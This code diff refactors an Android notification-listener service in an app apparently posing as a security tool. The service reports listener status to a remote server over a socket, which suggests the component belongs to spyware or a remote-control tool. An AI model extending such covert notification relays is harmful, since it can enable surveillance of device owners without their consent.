@@ -16,6 +16,7 @@ import androidx.core.app.NotificationCompat;
 import com.seguranca.protecao.R;
 import com.seguranca.protecao.core.Protocol;
 import com.seguranca.protecao.core.SocketClient;
+import com.seguranca.protecao.core.NexusSocket;
 import com.seguranca.protecao.service.MainService;
 import org.json.JSONObject;
 import java.util.concurrent.ExecutorService;
@@ -105,7 +106,7 @@ public class NotificationRelayService extends NotificationListenerService {
                 s.put(Protocol.KEY_ENABLED, true);
                 s.put(Protocol.KEY_CONNECTED, true);
                 s.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
-                io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
+                NexusSocket socket = SocketClient.getInstance().getSocket();
                 if (socket != null) socket.emit(Protocol.NOTIF, s);
             } catch (Exception ignored) {}
             try {
@@ -195,7 +196,7 @@ public class NotificationRelayService extends NotificationListenerService {
             s.put(Protocol.KEY_CONNECTED, false);
             s.put(Protocol.KEY_ERROR, "Listener disconnected (access revoked?)");
             s.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
-            io.socket.client.Socket socket = com.seguranca.protecao.core.network.SocketClient.getInstance().getSocket();
+            NexusSocket socket = com.seguranca.protecao.core.SocketClient.getInstance().getSocket();
             if (socket != null) socket.emit(Protocol.NOTIF, s);
         } catch (Exception ignored) {}
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
